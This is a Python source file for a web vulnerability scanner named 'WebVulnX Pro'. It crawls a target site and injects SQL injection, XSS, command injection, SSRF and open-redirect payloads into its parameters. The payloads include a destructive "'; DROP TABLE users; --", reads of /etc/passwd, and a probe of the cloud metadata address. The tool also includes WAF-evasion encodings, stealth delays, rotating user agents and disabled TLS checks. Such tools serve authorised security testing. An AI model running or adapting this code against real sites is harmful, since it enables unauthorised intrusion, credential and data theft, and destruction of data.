import requests
import argparse
import json
import time
import random
import string
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from playwright.sync_api import sync_playwright

# --- Configuration & Payloads ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
]

# Advanced Payloads
SQL_PAYLOADS = ["'", '"', "\\", "' OR '1'='1", "\" OR \"1\"=\"1", "1' OR '1'='1' -- ", "1\" OR \"1\"=\"1\" -- ", "'; DROP TABLE users; --", "'; WAITFOR DELAY '00:00:05' --", "' AND SLEEP(5) -- ", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- "]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "';alert('XSS');//", "<svg onload=alert('XSS')>", "javascript:alert('XSS')", "-alert(1)-", "';alert(String.fromCharCode(88,83,83));//"]
COMMAND_PAYLOADS = ["; ls -la", "| whoami", "& id", "; cat /etc/passwd", "`ping -c 5 127.0.0.1`"]
SSRF_PAYLOADS = ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd", "ftp://example.com"]
OPEN_REDIRECT_PAYLOADS = ["https://evil.com", "//evil.com", "/\\evil.com"]

# WAF Signatures
WAF_SIGNATURES = {
    "Cloudflare": ["cf-ray", "__cfduid"],
    "Akamai": ["akamai-origin-hop"],
    "ModSecurity": ["ModSecurity", "NOYB"],
    "AWS WAF": ["aws-waf-token"],
    "Imperva": ["incap_ses", "visid_incap"]
}

# --- Helper Functions ---
def get_random_headers():
    return {'User-Agent': random.choice(USER_AGENTS)}

def check_waf(response):
    """Attempts to fingerprint the WAF from response headers and content."""
    detected_waf = "Unknown"
    headers = {k.lower(): v for k, v in response.headers.items()}
    for waf_name, signatures in WAF_SIGNATURES.items():
        if any(sig in headers for sig in signatures):
            detected_waf = waf_name
            break
    return detected_waf

def advanced_bypass(payload, waf_name):
    """Generates WAF-specific bypasses."""
    bypasses = [payload] # Start with the original
    if waf_name == "Cloudflare":
        # Cloudflare is often bypassed with Unicode and payload fragmentation
        bypasses.append(payload.replace("alert", "\u0061\u006c\u0065\u0072\u0074"))
        bypasses.append(payload.replace("<script>", "<script>"))
    elif waf_name == "ModSecurity":
        # ModSecurity can be sensitive to comment syntax and encoding
        bypasses.append(payload.replace(" ", "/**/"))
        bypasses.append(requests.utils.quote(payload))
    
    # Generic bypasses
    bypasses.append(''.join(random.choice((str.upper, str.lower))(c) for c in payload))
    bypasses.append(requests.utils.quote(payload))
    bypasses.append(requests.utils.quote(requests.utils.quote(payload)))
    return list(set(bypasses))

# --- Advanced Crawler with Playwright ---
class AdvancedCrawler:
    def __init__(self, target_url, session, max_depth=2, stealth=True):
        self.target_url = target_url
        self.session = session
        self.max_depth = max_depth
        self.stealth = stealth
        self.visited_urls = set()
        self.discovered_urls = set()
        self.discovered_forms = []
        self.discovered_api_endpoints = set()

    def crawl(self):
        print(f"[*] Starting advanced crawl with Playwright on {self.target_url}")
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context()
            page = context.new_page()
            
            # Intercept network requests to find API endpoints
            def handle_request(request):
                if "api" in request.url or request.resource_type in ["xhr", "fetch"]:
                    self.discovered_api_endpoints.add(request.url.split('?')[0])
            
            page.on("request", handle_request)
            page.goto(self.target_url)
            time.sleep(3) # Wait for initial JS execution

            self._recursive_crawl(page, self.target_url, self.max_depth)
            
            browser.close()
        
        return list(self.discovered_urls), self.discovered_forms, list(self.discovered_api_endpoints)

    def _recursive_crawl(self, page, current_url, depth):
        if depth <= 0 or current_url in self.visited_urls:
            return

        self.visited_urls.add(current_url)
        self.discovered_urls.add(current_url)
        
        if self.stealth:
            time.sleep(random.uniform(0.5, 1.5))

        content = page.content()
        soup = BeautifulSoup(content, 'html.parser')

        # Find forms
        for form in soup.find_all('form'):
            action = form.get('action')
            method = form.get('method', 'get').lower()
            form_url = urljoin(current_url, action)
            inputs = form.find_all('input', {'name': True})
            form_details = {'url': form_url, 'method': method, 'params': {i.get('name'): 'test' for i in inputs}}
            if form_details['params']:
                self.discovered_forms.append(form_details)

        # Find links and recurse
        for a_tag in soup.find_all('a', href=True):
            link = urljoin(current_url, a_tag['href'])
            if urlparse(link).netloc == urlparse(self.target_url).netloc:
                try:
                    page.goto(link)
                    self._recursive_crawl(page, link, depth - 1)
                except Exception as e:
                    print(f"[-] Error navigating to {link}: {e}")

# --- Authentication Module ---
def authenticate(session, login_url, username, password):
    print(f"[*] Attempting to authenticate at {login_url}")
    try:
        # First, get the login page to parse for form fields and potential CSRF tokens
        login_page_response = session.get(login_url, headers=get_random_headers())
        soup = BeautifulSoup(login_page_response.text, 'html.parser')
        
        # Find the login form (this is a simplified approach)
        login_form = soup.find('form')
        if not login_form:
            print("[-] Could not find login form. Authentication failed.")
            return False

        # Find username and password fields
        username_field = login_form.find('input', {'type': 'text', 'name': True}) or login_form.find('input', {'name': True, 'id': True, 'class': True})
        password_field = login_form.find('input', {'type': 'password', 'name': True})

        if not username_field or not password_field:
            print("[-] Could not find username/password fields. Authentication failed.")
            return False

        payload = {
            username_field.get('name'): username,
            password_field.get('name'): password
        }
        
        # Add any other hidden inputs (like CSRF tokens)
        for hidden_input in login_form.find_all('input', {'type': 'hidden'}):
            payload[hidden_input.get('name')] = hidden_input.get('value')

        # Submit the login form
        post_url = urljoin(login_url, login_form.get('action'))
        response = session.post(post_url, data=payload, headers=get_random_headers(), allow_redirects=False)

        # Check if login was successful (e.g., by status code or cookies)
        if response.status_code in [302, 303] or 'session' in response.cookies.get_dict():
            print("[+] Authentication successful!")
            return True
        else:
            print("[-] Authentication failed. Check credentials or form fields.")
            return False

    except Exception as e:
        print(f"[-] An error occurred during authentication: {e}")
        return False

# --- Vulnerability Scanners (Refactored) ---
class VulnerabilityScanner:
    def __init__(self, session):
        self.session = session
        self.vulnerabilities = []

    def run_scans(self, urls, forms, api_endpoints):
        print("[*] Starting vulnerability scans...")
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = []
            for url in urls:
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                if params:
                    futures.append(executor.submit(self._scan_endpoint, 'GET', url, params))
                futures.append(executor.submit(self._scan_idor, url))
            
            for form in forms:
                futures.append(executor.submit(self._scan_endpoint, form['method'], form['url'], form['params']))

            for endpoint in api_endpoints:
                # Simple test for API endpoints, assuming they might take JSON
                futures.append(executor.submit(self._scan_api_endpoint, endpoint))

            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.vulnerabilities.append(result)
        return self.vulnerabilities

    def _scan_endpoint(self, method, url, params):
        # Scans for SQLi, XSS, CMDi, SSRF, Open Redirect
        for param in params:
            original_value = params[param]
            
            # SQLi
            for payload in SQL_PAYLOADS:
                vuln = self._test_payload(method, url, param, payload, "SQL Injection", self._check_sqli)
                if vuln: return vuln
            
            # XSS
            for payload in XSS_PAYLOADS:
                vuln = self._test_payload(method, url, param, payload, "Cross-Site Scripting (XSS)", self._check_xss)
                if vuln: return vuln

            # Command Injection
            for payload in COMMAND_PAYLOADS:
                vuln = self._test_payload(method, url, param, payload, "Command Injection", self._check_command)
                if vuln: return vuln

            # SSRF
            for payload in SSRF_PAYLOADS:
                vuln = self._test_payload(method, url, param, payload, "Server-Side Request Forgery (SSRF)", self._check_ssrf)
                if vuln: return vuln

            # Open Redirect
            if 'redirect' in param.lower() or 'url' in param.lower() or 'return' in param.lower():
                for payload in OPEN_REDIRECT_PAYLOADS:
                    vuln = self._test_payload(method, url, param, payload, "Open Redirect", self._check_redirect)
                    if vuln: return vuln
        return None

    def _test_payload(self, method, url, param, payload, vuln_type, check_func):
        test_params = {param: payload}
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=test_params, headers=get_random_headers(), timeout=15, verify=False)
            else: # POST
                response = self.session.post(url, data=test_params, headers=get_random_headers(), timeout=15, verify=False)

            # WAF Detection and Bypass
            waf = check_waf(response)
            if response.status_code in [403, 406, 501] or any(block in response.text.lower() for block in ["blocked", "forbidden", "incident"]):
                print(f"[!] WAF ({waf}) detected on {url} for param '{param}'. Attempting bypass.")
                for bypass_payload in advanced_bypass(payload, waf):
                    bypass_params = {param: bypass_payload}
                    if method.upper() == 'GET':
                        bypass_response = self.session.get(url, params=bypass_params, headers=get_random_headers(), timeout=15, verify=False)
                    else:
                        bypass_response = self.session.post(url, data=bypass_params, headers=get_random_headers(), timeout=15, verify=False)
                    if check_func(bypass_response):
                        return {"url": url, "param": param, "payload": bypass_payload, "type": f"{vuln_type} (Bypassed: {waf})"}
                return None # Bypass failed

            if check_func(response):
                return {"url": url, "param": param, "payload": payload, "type": vuln_type}
        except Exception as e:
            print(f"[-] Error during scan: {e}")
        return None

    def _scan_idor(self, url):
        # Basic IDOR check for numeric IDs in path
        path_parts = urlparse(url).path.split('/')
        for part in path_parts:
            if part.isdigit():
                original_id = part
                # Try a different ID
                new_id = str(int(original_id) + 1)
                test_url = url.replace(f"/{original_id}/", f"/{new_id}/")
                try:
                    resp = self.session.get(test_url, headers=get_random_headers(), timeout=10, verify=False)
                    if resp.status_code == 200 and len(resp.text) > 500: # A basic check for a valid page
                        return {"url": test_url, "param": "Path ID", "payload": f"Changed {original_id} to {new_id}", "type": "Insecure Direct Object Reference (IDOR)"}
                except Exception:
                    pass
        return None

    def _scan_api_endpoint(self, endpoint):
        # A placeholder for more complex API testing
        print(f"[*] Discovered API Endpoint: {endpoint}")
        # Could try fuzzing with JSON payloads here
        return None

    # --- Check Functions ---
    def _check_sqli(self, response): return any(err in response.text.lower() for err in ["sql syntax", "mysql_fetch", "ora-", "microsoft ole db"]) or response.elapsed.total_seconds() > 4.5
    def _check_xss(self, response): return any(payload in response.text for payload in XSS_PAYLOADS)
    def _check_command(self, response): return any(out in response.text for out in ["uid=", "gid=", "root:", "www-data"]) or response.elapsed.total_seconds() > 4.5
    def _check_ssrf(self, response): return "127.0.0.1" in response.text or "root:" in response.text or "latest meta-data" in response.text
    def _check_redirect(self, response): return response.is_redirect and "evil.com" in response.headers.get('Location', '')


# --- Main Execution ---
def main():
    parser = argparse.ArgumentParser(description="WebVulnX Pro - Advanced Vulnerability Discovery Tool")
    parser.add_argument("url", help="The target URL (e.g., http://testphp.vulnweb.com)")
    parser.add_argument("--depth", type=int, default=2, help="Crawling depth (default: 2)")
    parser.add_argument("--login-url", help="URL of the login page to authenticate")
    parser.add_argument("-u", "--username", help="Username for authentication")
    parser.add_argument("-p", "--password", help="Password for authentication")
    parser.add_argument("-o", "--output", help="Output file to save results in JSON format")
    args = parser.parse_args()

    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

    print("--- WebVulnX Pro - Starting Advanced Scan ---")
    
    session = requests.Session()
    
    # Authentication
    if args.login_url and args.username and args.password:
        if not authenticate(session, args.login_url, args.username, args.password):
            print("[-] Exiting due to authentication failure.")
            return

    # Crawl
    crawler = AdvancedCrawler(args.url, session, args.depth)
    urls, forms, api_endpoints = crawler.crawl()
    print(f"\n[*] Discovered {len(urls)} URLs, {len(forms)} forms, and {len(api_endpoints)} API endpoints.")

    # Scan
    scanner = VulnerabilityScanner(session)
    vulnerabilities = scanner.run_scans(urls, forms, api_endpoints)

    # Report
    print("\n--- Scan Complete ---")
    if not vulnerabilities:
        print("\033[92m[+] No critical vulnerabilities found.\033[0m")
    else:
        print(f"\n\033[91m[!] Found {len(vulnerabilities)} potential vulnerabilities:\033[0m")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"\n--- Vulnerability #{i} ---")
            print(f"  Type: \033[91m{vuln['type']}\033[0m")
            print(f"  URL: {vuln['url']}")
            print(f"  Parameter: {vuln['param']}")
            print(f"  Payload: {vuln['payload']}")
    
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(vulnerabilities, f, indent=4)
        print(f"\n[*] Results saved to {args.output}")

    print("\n--- End of Report ---")

if __name__ == "__main__":
    main()
